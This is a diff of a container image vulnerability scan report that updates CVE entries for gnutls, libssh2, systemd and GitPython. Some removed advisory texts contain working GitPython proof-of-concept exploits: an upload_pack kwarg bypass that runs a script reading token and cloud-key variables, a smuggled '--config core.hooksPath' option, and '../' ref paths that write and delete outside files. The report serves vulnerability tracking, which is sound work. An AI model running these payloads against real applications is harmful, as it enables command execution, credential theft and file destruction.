@@ -1,6 +1,6 @@
 {
   "SchemaVersion": 2,
-  "CreatedAt": "2026-05-07T23:22:50.138724086Z",
+  "CreatedAt": "2026-05-09T09:50:10.04897556Z",
   "ArtifactName": "hypercode-core:latest",
   "ArtifactType": "container_image",
   "Metadata": {
@@ -314,14 +314,15 @@
             "https://access.redhat.com/errata/RHSA-2026:12441",
             "https://access.redhat.com/errata/RHSA-2026:13285",
             "https://access.redhat.com/errata/RHSA-2026:14162",
+            "https://access.redhat.com/errata/RHSA-2026:14937",
             "https://access.redhat.com/errata/RHSA-2026:7473",
             "https://access.redhat.com/security/cve/CVE-2026-4878",
             "https://bugzilla.redhat.com/2451615",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2447554",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2451615",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-4878",
-            "https://errata.almalinux.org/9/ALSA-2026-12441.html",
-            "https://errata.rockylinux.org/RLSA-2026:12441",
+            "https://errata.almalinux.org/8/ALSA-2026-13285.html",
+            "https://errata.rockylinux.org/RLSA-2026:12423",
             "https://github.com/AndrewGMorgan/libcap_mirror/security/advisories/GHSA-f78v-p5hx-m7hh",
             "https://linux.oracle.com/cve/CVE-2026-4878.html",
             "https://linux.oracle.com/errata/ELSA-2026-13285.html",
@@ -331,7 +332,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-4878"
           ],
           "PublishedDate": "2026-04-09T16:16:31.987Z",
-          "LastModifiedDate": "2026-05-06T16:16:10.867Z"
+          "LastModifiedDate": "2026-05-07T22:16:36.237Z"
         },
         {
           "VulnerabilityID": "CVE-2026-25210",
@@ -541,6 +542,94 @@
           "LastModifiedDate": "2026-05-07T02:09:04.47Z"
         },
         {
+          "VulnerabilityID": "CVE-2026-42010",
+          "PkgID": "libgnutls30t64@3.8.9-3+deb13u2",
+          "PkgName": "libgnutls30t64",
+          "PkgIdentifier": {
+            "PURL": "pkg:deb/debian/libgnutls30t64@3.8.9-3%2Bdeb13u2?arch=amd64\u0026distro=debian-13.4",
+            "UID": "5f384f528c31fbfe"
+          },
+          "InstalledVersion": "3.8.9-3+deb13u2",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:d8fecfe3e027d286c17c778d50aa6273a202169940ae7291e9e08ba011756482",
+            "DiffID": "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc"
+          },
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42010",
+          "DataSource": {
+            "ID": "debian",
+            "Name": "Debian Security Tracker",
+            "URL": "https://salsa.debian.org/security-tracker-team/security-tracker"
+          },
+          "Title": "gnutls: gnutls: Authentication Bypass via NUL Character in Username",
+          "Description": "A flaw was found in gnutls. Servers configured with RSA-PSK (Rivest–Shamir–Adleman – Pre-Shared Key) wrongfully matched usernames containing a NUL character with truncated usernames. A remote attacker could exploit this by sending a specially crafted username, leading to an authentication bypass. This vulnerability allows an attacker to gain unauthorized access by circumventing the authentication process.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-626"
+          ],
+          "VendorSeverity": {
+            "redhat": 3
+          },
+          "CVSS": {
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 7.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-42010",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2467289",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42010",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42010"
+          ],
+          "PublishedDate": "2026-05-07T12:16:17.977Z",
+          "LastModifiedDate": "2026-05-07T15:16:09.64Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42011",
+          "PkgID": "libgnutls30t64@3.8.9-3+deb13u2",
+          "PkgName": "libgnutls30t64",
+          "PkgIdentifier": {
+            "PURL": "pkg:deb/debian/libgnutls30t64@3.8.9-3%2Bdeb13u2?arch=amd64\u0026distro=debian-13.4",
+            "UID": "5f384f528c31fbfe"
+          },
+          "InstalledVersion": "3.8.9-3+deb13u2",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:d8fecfe3e027d286c17c778d50aa6273a202169940ae7291e9e08ba011756482",
+            "DiffID": "sha256:95dc24ca65ce2fd397687805c7e114b2d0b0bb2e601aefcefa3c3c2817e605bc"
+          },
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42011",
+          "DataSource": {
+            "ID": "debian",
+            "Name": "Debian Security Tracker",
+            "URL": "https://salsa.debian.org/security-tracker-team/security-tracker"
+          },
+          "Title": "gnutls: gnutls: Security bypass due to incorrect name constraint handling",
+          "Description": "A flaw was found in gnutls. This vulnerability occurs because permitted name constraints were incorrectly ignored when previous Certificate Authorities (CAs) only had excluded name constraints. A remote attacker could exploit this to bypass critical name constraint checks during certificate validation. This bypass could lead to the acceptance of invalid certificates, potentially enabling spoofing or man-in-the-middle attacks against affected systems.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-295"
+          ],
+          "VendorSeverity": {
+            "redhat": 2
+          },
+          "CVSS": {
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-42011",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2467437",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42011",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42011"
+          ],
+          "PublishedDate": "2026-05-07T15:16:09.76Z",
+          "LastModifiedDate": "2026-05-07T15:48:55.55Z"
+        },
+        {
           "VulnerabilityID": "CVE-2025-69720",
           "PkgID": "libncursesw6@6.5+20250216-2",
           "PkgName": "libncursesw6",
@@ -655,7 +744,7 @@
           },
           "References": [
             "http://www.openwall.com/lists/oss-security/2026/03/20/3",
-            "https://access.redhat.com/errata/RHSA-2026:7896",
+            "https://access.redhat.com/errata/RHSA-2026:8339",
             "https://access.redhat.com/security/cve/CVE-2026-27135",
             "https://bugzilla.redhat.com/2441268",
             "https://bugzilla.redhat.com/2442922",
@@ -663,8 +752,8 @@
             "https://bugzilla.redhat.com/2453151",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2448754",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
-            "https://errata.almalinux.org/9/ALSA-2026-7896.html",
-            "https://errata.rockylinux.org/RLSA-2026:7668",
+            "https://errata.almalinux.org/8/ALSA-2026-8339.html",
+            "https://errata.rockylinux.org/RLSA-2026:7666",
             "https://github.com/nghttp2/nghttp2/commit/5c7df8fa815ac1004d9ecb9d1f7595c4d37f46e1",
             "https://github.com/nghttp2/nghttp2/security/advisories/GHSA-6933-cjhr-5qg6",
             "https://linux.oracle.com/cve/CVE-2026-27135.html",
@@ -697,24 +786,33 @@
             "Name": "Debian Security Tracker",
             "URL": "https://salsa.debian.org/security-tracker-team/security-tracker"
           },
-          "Title": "A security vulnerability has been detected in libssh2 up to 1.11.1. Th ...",
+          "Title": "libssh2: integer overflow via large username or password arguments",
           "Description": "A security vulnerability has been detected in libssh2 up to 1.11.1. The impacted element is the function userauth_password of the file src/userauth.c. Such manipulation of the argument username_len/password_len leads to integer overflow. The attack may be launched remotely. The name of the patch is 256d04b60d80bf1190e96b0ad1e91b2174d744b1. A patch should be applied to remediate this issue.",
-          "Severity": "HIGH",
+          "Severity": "CRITICAL",
           "CweIDs": [
             "CWE-189",
             "CWE-190"
           ],
           "VendorSeverity": {
-            "azure": 3
+            "azure": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
+              "V3Score": 9.1
+            }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-7598",
             "https://github.com/libssh2/libssh2/",
             "https://github.com/libssh2/libssh2/commit/256d04b60d80bf1190e96b0ad1e91b2174d744b1",
             "https://github.com/libssh2/libssh2/pull/1858",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-7598",
             "https://vuldb.com/submit/805564",
             "https://vuldb.com/vuln/360555",
-            "https://vuldb.com/vuln/360555/cti"
+            "https://vuldb.com/vuln/360555/cti",
+            "https://www.cve.org/CVERecord?id=CVE-2026-7598"
           ],
           "PublishedDate": "2026-05-01T22:16:16.947Z",
           "LastModifiedDate": "2026-05-07T01:47:08.857Z"
@@ -761,10 +859,10 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:13677",
+            "https://access.redhat.com/errata/RHSA-2026:13651",
             "https://access.redhat.com/security/cve/CVE-2026-29111",
             "https://bugzilla.redhat.com/2450505",
-            "https://errata.almalinux.org/9/ALSA-2026-13677.html",
+            "https://errata.almalinux.org/10/ALSA-2026-13651.html",
             "https://github.com/systemd/systemd/commit/1d22f706bd04f45f8422e17fbde3f56ece17758a",
             "https://github.com/systemd/systemd/commit/20021e7686426052e3a7505425d7e12085feb2a6",
             "https://github.com/systemd/systemd/commit/21167006574d6b83813c7596759b474f56562412",
@@ -898,10 +996,10 @@
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:13677",
+            "https://access.redhat.com/errata/RHSA-2026:13651",
             "https://access.redhat.com/security/cve/CVE-2026-29111",
             "https://bugzilla.redhat.com/2450505",
-            "https://errata.almalinux.org/9/ALSA-2026-13677.html",
+            "https://errata.almalinux.org/10/ALSA-2026-13651.html",
             "https://github.com/systemd/systemd/commit/1d22f706bd04f45f8422e17fbde3f56ece17758a",
             "https://github.com/systemd/systemd/commit/20021e7686426052e3a7505425d7e12085feb2a6",
             "https://github.com/systemd/systemd/commit/21167006574d6b83813c7596759b474f56562412",
@@ -1097,9 +1195,12 @@
             "Name": "GitHub Security Advisory pip",
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
           },
-          "Title": "GitPython has Command Injection via Git options bypass",
-          "Description": "### Summary\nGitPython blocks dangerous Git options such as `--upload-pack` and `--receive-pack` by default, but the equivalent Python kwargs `upload_pack` and `receive_pack` bypass that check. If an application passes attacker-controlled kwargs into `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`, this leads to arbitrary command execution even when `allow_unsafe_options` is left at its default value of `False`.\n\n### Details\nGitPython explicitly treats helper-command options as unsafe because they can be used to execute arbitrary commands:\n\n- `git/repo/base.py:145-153` marks clone options such as `--upload-pack`, `-u`, `--config`, and `-c` as unsafe.\n- `git/remote.py:535-548` marks fetch/pull/push options such as `--upload-pack`, `--receive-pack`, and `--exec` as unsafe.\n\nThe vulnerable API paths check the raw kwarg names before they're its normalized into command-line flags:\n\n- `Repo.clone_from()` checks `list(kwargs.keys())` in `git/repo/base.py:1387-1390`\n- `Remote.fetch()` checks `list(kwargs.keys())` in `git/remote.py:1070-1071`\n- `Remote.pull()` checks `list(kwargs.keys())` in `git/remote.py:1124-1125`\n- `Remote.push()` checks `list(kwargs.keys())` in `git/remote.py:1197-1198`\n\nThat validation is performed by `Git.check_unsafe_options()` in `git/cmd.py:948-961`. The validator correctly blocks option names such as `upload-pack`, `receive-pack`, and `exec`.\n\nLater, GitPython converts Python kwargs into Git command-line flags in `Git.transform_kwarg()` at `git/cmd.py:1471-1484`. During that step, underscore-form kwargs are dashified:\n\n- `upload_pack=...` becomes `--upload-pack=...`\n- `receive_pack=...` becomes `--receive-pack=...`\n\nBecause the unsafe-option check runs before this normalization, underscore-form kwargs bypass the safety check even though they become the exact dangerous Git flags that the code is supposed to reject.\n\nIn practice:\n\n- `remote.fetch(**{\"upload-pack\": helper})` is blocked with `UnsafeOptionError`\n- `remote.fetch(upload_pack=helper)` is allowed and reaches helper execution\n\nThe same bypass works for:\n\n```python\nRepo.clone_from(origin, out, upload_pack=helper)\nrepo.remote(\"origin\").fetch(upload_pack=helper)\nrepo.remote(\"origin\").pull(upload_pack=helper)\nrepo.remote(\"origin\").push(receive_pack=helper)\n```\n\nThis does not appear to affect every unsafe option. For example, `exec=` is already rejected because the raw kwarg name `exec` matches the blocked option name before normalization.\n\nExisting tests cover the hyphenated form, not the vulnerable underscore form. For example:\n\n- `test/test_clone.py:129-136` checks `{\"upload-pack\": ...}`\n- `test/test_remote.py:830-833` checks `{\"upload-pack\": ...}`\n- `test/test_remote.py:968-975` checks `{\"receive-pack\": ...}`\n\nThose tests correctly confirm the literal Git option names are blocked, but they do not exercise the normal Python kwarg spelling that bypasses the guard.\n\n### PoC\n1. Create and activate a virtual environment in the repository root:\n\n```bash\npython3 -m venv .venv-sec\n.venv-sec/bin/pip install setuptools gitdb\nsource ./.venv-sec/bin/activate\n```\n\n2. make a new python file and put the following in there, then run it:\n\n```python\nimport os\nimport stat\nimport subprocess\nimport tempfile\n\nfrom git import Repo\nfrom git.exc import UnsafeOptionError\n\n# Setup: create isolated repositories so the PoC uses a normal fetch flow.\nbase = tempfile.mkdtemp(prefix=\"gp-poc-risk-\")\norigin = os.path.join(base, \"origin.git\")\nproducer = os.path.join(base, \"producer\")\nvictim = os.path.join(base, \"victim\")\nproof = os.path.join(base, \"proof.txt\")\nwrapper = os.path.join(base, \"wrapper.sh\")\n\n# Setup: this wrapper is just to demo things you can do, not required for the exploit to work\n# you could also do something like an SSH reverse shell, really anything\nwith open(wrapper, \"w\") as f:\n    f.write(f\"\"\"#!/bin/sh\n{{\n  echo \"code_exec=1\"\n  echo \"whoami=$(id)\"\n  echo \"cwd=$(pwd)\"\n  echo \"uname=$(uname -a)\"\n  printf 'argv='; printf '\u003c%s\u003e' \"$@\"; echo\n  env | grep -E '^(HOME|USER|PATH|SSH_AUTH_SOCK|CI|GITHUB_TOKEN|AWS_|AZURE_|GOOGLE_)=' | sed 's/=.*$/=\u003credacted\u003e/' || true\n}} \u003e '{proof}'\nexec git-upload-pack \"$@\"\n\"\"\")\nos.chmod(wrapper, stat.S_IRWXU)\n\nsubprocess.run([\"git\", \"init\", \"--bare\", origin], check=True, stdout=subprocess.DEVNULL)\nsubprocess.run([\"git\", \"clone\", origin, producer], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\nwith open(os.path.join(producer, \"README\"), \"w\") as f:\n    f.write(\"x\")\n\nsubprocess.run([\"git\", \"-C\", producer, \"add\", \"README\"], check=True, stdout=subprocess.DEVNULL)\nsubprocess.run(\n    [\"git\", \"-C\", producer, \"-c\", \"user.name=t\", \"-c\", \"user.email=t@t\", \"commit\", \"-m\", \"init\"],\n    check=True,\n    stdout=subprocess.DEVNULL,\n)\nsubprocess.run([\"git\", \"-C\", producer, \"push\", \"origin\", \"HEAD\"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\nsubprocess.run([\"git\", \"clone\", origin, victim], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\nrepo = Repo(victim)\nremote = repo.remote(\"origin\")\n\n# the literal Git option name is properly blocked.\ntry:\n    remote.fetch(**{\"upload-pack\": wrapper})\n    print(\"control=unexpected_success\")\nexcept UnsafeOptionError:\n    print(\"control=blocked\")\n\n# this is the actual vulnerability\n# you can also just do upload_pack=\"touch /tmp/proof\", the wrapper is just to show greater impact\n# if you do the \"touch /tmp/proof\" the script will crash, but the file will have been created\nremote.fetch(upload_pack=wrapper)\n\n# Proof: the helper ran as the GitPython host process.\nprint(\"proof_exists\", os.path.exists(proof), proof)\nprint(open(proof).read())\n```\n\n3. Expected result:\n\n- The script prints `control=blocked`\n- The script prints `proof_exists True ...`\n- The proof file contains evidence that the attacker-controlled helper executed as the local application account, including `id`, working directory, argv, and selected environment variable names\n\nExample output:\n\n```bash\nGitPython % python3 test.py\ncontrol=blocked\nproof_exists True /var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/proof.txt\ncode_exec=1\nwhoami=uid=501(wes) gid=20(staff) \u003credacted\u003e\ncwd=/private/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/victim\nuname=Darwin  \u003credacted\u003e Darwin Kernel Version  \u003credacted\u003e; root:xnu-11417. \u003credacted\u003e\nargv=\u003c/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/origin.git\u003e\nUSER=\u003credacted\u003e\nSSH_AUTH_SOCK=\u003credacted\u003e\nPATH=\u003credacted\u003e\nHOME=\u003credacted\u003e\n```\n\nThis PoC does not require a malicious repository. The PoC uses that fresh blank repository. The only attacker-controlled input is the kwarg that GitPython turns into `--upload-pack`.\n\n### Impact\nWho is impacted:\n- Web applications that let users configure repository import, sync, mirroring, fetch, pull, or push behavior\n- Systems that accept a user-provided dict of \"extra Git options\" and pass it into GitPython with `**kwargs`\n- CI/CD systems, workers, automation bots, or internal tools that build GitPython calls from untrusted integration settings or job definitions (yaml, json, etc configs )\n\nWhat the attacker needs to control:\n\n- A value that becomes `upload_pack` or `receive_pack` in the kwargs passed to `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`\n\nFrom a severity perspective, this could lead to\n- Theft of SSH keys, deploy credentials, API tokens, or cloud credentials available to the process\n- Modification of repositories, build outputs, or release artifacts\n- Lateral movement from CI/CD workers or automation hosts\n- Full compromise of the worker or service process handling repository operations\n\nThe highest-risk environments are network-reachable services and automation systems that expose these GitPython kwargs across a trust boundary while relying on the default unsafe-option guard for protection.",
+          "Title": "GitPython is a python library used to interact with Git repositories.  ...",
+          "Description": "GitPython is a python library used to interact with Git repositories. From version 3.1.30 to before version 3.1.47, GitPython blocks dangerous Git options such as --upload-pack and --receive-pack by default, but the equivalent Python kwargs upload_pack and receive_pack bypass that check. If an application passes attacker-controlled kwargs into Repo.clone_from(), Remote.fetch(), Remote.pull(), or Remote.push(), this leads to arbitrary command execution even when allow_unsafe_options is left at its default value of False. This issue has been patched in version 3.1.47.",
           "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-78"
+          ],
           "VendorSeverity": {
             "ghsa": 3
           },
@@ -1111,8 +1212,12 @@
           },
           "References": [
             "https://github.com/gitpython-developers/GitPython",
-            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rpm5-65cw-6hj4"
-          ]
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.47",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rpm5-65cw-6hj4",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42215"
+          ],
+          "PublishedDate": "2026-05-07T19:16:01.64Z",
+          "LastModifiedDate": "2026-05-08T22:16:32.523Z"
         },
         {
           "VulnerabilityID": "CVE-2026-42284",
@@ -1136,22 +1241,35 @@
             "Name": "GitHub Security Advisory pip",
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
           },
-          "Title": "GitPython: Unsafe option check validates multi_options before shlex.split transformation",
-          "Description": "### Summary\n\n`_clone()` validates `multi_options` as the original list, then executes `shlex.split(\" \".join(multi_options))`. A string like `\"--branch main --config core.hooksPath=/x\"` passes validation (starts with `--branch`), but after split becomes `[\"--branch\", \"main\", \"--config\", \"core.hooksPath=/x\"]`. Git applies the config and executes attacker hooks during clone.\n\n### Details\n\nThe vulnerable code is in [`git/repo/base.py` line 1383](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1383):\n```python\nmulti = shlex.split(\" \".join(multi_options))\n```\n\nThen validation runs on the **original** list at [line 1390](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1390):\n```python\nGit.check_unsafe_options(options=multi_options, unsafe_options=cls.unsafe_git_clone_options)\n```\n\nThen execution uses the **transformed** result at [line 1392](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1392):\n```python\nproc = git.clone(multi, \"--\", url, path, ...)\n```\n\nThe [check at `git/cmd.py` line 959](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/cmd.py#L959) uses `startswith`:\n```python\nif option.startswith(unsafe_option) or option == bare_option:\n```\n\n`\"--branch main --config ...\"` does not start with `\"--config\"`, so it passes. After `shlex.split`, `\"--config\"` becomes its own token and reaches git.\n\nAlso affects `Submodule.update()` via `clone_multi_options`.\n\n### PoC\n\n```python\nimport sys, pathlib, subprocess\nsys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))\n\nfrom git import Repo\nfrom git.exc import UnsafeOptionError\n\ntry:\n    Repo.clone_from(\"/nonexistent\", \"/tmp/x\", multi_options=[\"--config\", \"core.hooksPath=/x\"])\nexcept UnsafeOptionError:\n    print(\"multi_options=['--config', '...']: Block as expected\")\nexcept Exception:\n    pass\n\nDIR = pathlib.Path(__file__).resolve().parent / \"workdir_b\"\nSRC = DIR / \"repo\"\nDST = DIR / \"dst\"\nHOOKS = DIR / \"hooks\"\nLOG = DIR / \"output.log\"\n\nif not SRC.exists():\n    SRC.mkdir(parents=True)\n    r = lambda *a: subprocess.run(a, cwd=SRC, capture_output=True)\n    r(\"git\", \"init\", \"-b\", \"main\")\n    (SRC / \"f\").write_text(\"x\\n\")\n    r(\"git\", \"add\", \".\")\n    r(\"git\", \"commit\", \"-m\", \"init\")\n\nHOOKS.mkdir(exist_ok=True)\nhook = HOOKS / \"post-checkout\"\nhook.write_text(f\"#!/bin/sh\\nwhoami \u003e {LOG.as_posix()}\\nhostname \u003e\u003e {LOG.as_posix()}\\n\")\nhook.chmod(0o755)\n\nLOG.unlink(missing_ok=True)\npayload = \"--branch main --config core.hooksPath=\" + HOOKS.as_posix()\n\ntry:\n    Repo.clone_from(str(SRC), str(DST), multi_options=[payload])\nexcept UnsafeOptionError:\n    print(f\"multi_options=['{payload}']: BLOCKED\"); sys.exit(1)\nexcept Exception:\n    pass\n\nif not LOG.exists() and DST.exists():\n    subprocess.run([\"git\", \"checkout\", \"--force\", \"main\"], cwd=DST, capture_output=True)\n\nprint(f\"multi_options=['{payload}']: not blocked\")\nprint(f\"\\nHook executed: {LOG.exists()}\")\nif LOG.exists():\n    print(LOG.read_text().strip())\n```\n\n**Output:**\n```\nmulti_options=['--config', '...']: Block as expected\nmulti_options=['--branch main --config core.hooksPath=.../hooks']: not blocked\n\nHook executed: True\ntexugo\nDESKTOP-5w5HH79\n```\n\n### Impact\n\nAny application passing user input to `multi_options` in `clone_from()`, `clone()`, or `Submodule.update()` is vulnerable. Attacker embeds `--config core.hooksPath=\u003cdir\u003e` inside a string starting with a safe option. Check does not block it. Git executes attacker code. Same class as CVE-2023-40267.",
+          "Title": "GitPython is a python library used to interact with Git repositories.  ...",
+          "Description": "GitPython is a python library used to interact with Git repositories. Prior to version 3.1.47, _clone() validates multi_options as the original list, then executes shlex.split(\" \".join(multi_options)). A string like \"--branch main --config core.hooksPath=/x\" passes validation (starts with --branch), but after split becomes [\"--branch\", \"main\", \"--config\", \"core.hooksPath=/x\"]. Git applies the config and executes attacker hooks during clone. This issue has been patched in version 3.1.47.",
           "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-88"
+          ],
           "VendorSeverity": {
-            "ghsa": 3
+            "ghsa": 3,
+            "nvd": 4
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
               "V3Score": 8.1
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 9.8
             }
           },
           "References": [
             "https://github.com/gitpython-developers/GitPython",
-            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-x2qx-6953-8485"
-          ]
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.47",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-x2qx-6953-8485",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42284",
+            "https://www.tenable.com/cve/CVE-2026-32686"
+          ],
+          "PublishedDate": "2026-05-07T19:16:01.783Z",
+          "LastModifiedDate": "2026-05-08T23:16:36.25Z"
         },
         {
           "VulnerabilityID": "CVE-2026-44243",
@@ -1175,22 +1293,36 @@
             "Name": "GitHub Security Advisory pip",
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
           },
-          "Title": "GitPython reference APIs has a path traversal vulnerability that allows arbitrary file write and delete outside the repository",
-          "Description": "## 🧾 Summary\n\nA vulnerability in **GitPython** allows **attackers who can supply a crafted reference path to an application using GitPython** to **write, overwrite, move, or delete files outside the repository’s `.git` directory** via **insufficient validation of reference paths in reference creation, rename, and delete operations**.\n\n---\n\n## 📦 Affected Versions\n\n* Affected: `\u003c= 3.1.46` and current `main` (`3.1.47` in local checkout)\n\n---\n\n## 🧠 Details\n\n### Vulnerability Type\n\n**Path Traversal leading to Arbitrary File Write and Arbitrary File Deletion**\n\n---\n\n### Root Cause\n\nReference paths are validated when they are resolved for reading, but are not consistently validated before filesystem write, rename, and delete operations.\n\n`SymbolicReference._check_ref_name_valid()` rejects traversal sequences such as `..`, but `SymbolicReference.create`, `Reference.create`, `SymbolicReference.set_reference`, `SymbolicReference.rename`, and `SymbolicReference.delete` still construct filesystem paths from attacker-controlled ref names without enforcing repository boundaries.\n\n---\n\n### Affected Code\n\n```python\ndef set_reference(self, ref, logmsg=None):\n    ...\n    fpath = self.abspath\n    assure_directory_exists(fpath, is_file=True)\n\n    lfd = LockedFD(fpath)\n    fd = lfd.open(write=True, stream=True)\n    ...\n```\n\n```python\n@classmethod\ndef delete(cls, repo, path):\n    full_ref_path = cls.to_full_path(path)\n    abs_path = os.path.join(repo.common_dir, full_ref_path)\n    if os.path.exists(abs_path):\n        os.remove(abs_path)\n```\n\n```python\ndef rename(self, new_path, force=False):\n    new_path = self.to_full_path(new_path)\n    new_abs_path = os.path.join(_git_dir(self.repo, new_path), new_path)\n    cur_abs_path = os.path.join(_git_dir(self.repo, self.path), self.path)\n    ...\n    os.rename(cur_abs_path, new_abs_path)\n```\n\n---\n\n### Attack Vector\n\n**Local attack through application-controlled input passed into GitPython reference APIs**\n\n### Authentication Required\n\n**None at the library boundary. In practice, exploitation requires the ability to influence ref names supplied by the consuming application.**\n\n---\n\n## 🧪 Proof of Concept\n\n### Setup\n\n```bash\npip install GitPython==3.1.46\npython poc.py\n```\n\n---\n\n### Exploit\n\n```python\nimport shutil\nfrom pathlib import Path\n\nfrom git import Repo\nfrom git.refs.reference import Reference\nfrom git.refs.symbolic import SymbolicReference\n\nbase = Path(\"gp-ghsa-poc\").resolve()\nif base.exists():\n    shutil.rmtree(base)\n\nrepo_dir = base / \"repo\"\nrepo = Repo.init(repo_dir)\n\n(repo_dir / \"a.txt\").write_text(\"init\\n\", encoding=\"utf-8\")\nrepo.index.add([\"a.txt\"])\nrepo.index.commit(\"init\")\n\noutside_write = base / \"outside_write.txt\"\noutside_delete = base / \"outside_delete.txt\"\noutside_delete.write_text(\"DELETE ME\\n\", encoding=\"utf-8\")\n\nprint(f\"repo_dir       = {repo_dir}\")\nprint(f\"outside_write  = {outside_write}\")\nprint(f\"outside_delete = {outside_delete}\")\n\nReference.create(repo, \"../../../outside_write.txt\", \"HEAD\")\n\nprint(\"\\n[+] outside_write exists:\", outside_write.exists())\nif outside_write.exists():\n    print(\"[+] outside_write content:\")\n    print(outside_write.read_text(encoding=\"utf-8\"))\n\nSymbolicReference.delete(repo, \"../../../outside_delete.txt\")\n\nprint(\"\\n[+] outside_delete exists after delete:\", outside_delete.exists())\n```\n\n---\n\n### Result\n\n```text\nrepo_dir       = ...\\gp-ghsa-poc\\repo\noutside_write  = ...\\gp-ghsa-poc\\outside_write.txt\noutside_delete = ...\\gp-ghsa-poc\\outside_delete.txt\n\n[+] outside_write exists: True\n[+] outside_write content:\n\u003ccurrent HEAD commit SHA\u003e\n\n[+] outside_delete exists after delete: False\n```\n\n---\n\n## 💥 Impact\n\n### What can an attacker do?\n\n* Create or overwrite files outside the repository metadata directory\n* Delete attacker-chosen files reachable from the process permissions\n* Corrupt application state or configuration files\n* Cause denial of service by deleting or overwriting important files\n\n---\n\n### Security Impact\n\n* **Confidentiality:** Low\n* **Integrity:** High\n* **Availability:** High\n\n---\n\n### Who is affected?\n\n* Applications that expose GitPython reference operations to user-controlled input\n* Git automation services, repository management backends, CI/CD helpers, and developer platforms\n* Multi-user environments where one user can influence ref names processed on behalf of another workflow\n\n---\n\n## 🛠️ Mitigation / Fix\n\n### Recommended Fix\n\n```python\ndef _validate_ref_write_path(repo, path, *, for_git_dir=False):\n    SymbolicReference._check_ref_name_valid(path)\n\n    base = Path(repo.git_dir if for_git_dir else repo.common_dir).resolve()\n    target = (base / path).resolve()\n\n    if base not in [target, *target.parents]:\n        raise ValueError(f\"Reference path escapes repository boundary: {path}\")\n\n    return str(target)\n```\n\n```python\nfull_ref_path = cls.to_full_path(path)\n_validate_ref_write_path(repo, full_ref_path)\n```",
+          "Title": "GitPython is a python library used to interact with Git repositories.  ...",
+          "Description": "GitPython is a python library used to interact with Git repositories. Prior to version 3.1.48, a vulnerability in GitPython allows attackers who can supply a crafted reference path to an application using GitPython to write, overwrite, move, or delete files outside the repository’s .git directory via insufficient validation of reference paths in reference creation, rename, and delete operations. This issue has been patched in version 3.1.48.",
           "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22"
+          ],
           "VendorSeverity": {
-            "ghsa": 3
+            "ghsa": 3,
+            "nvd": 3
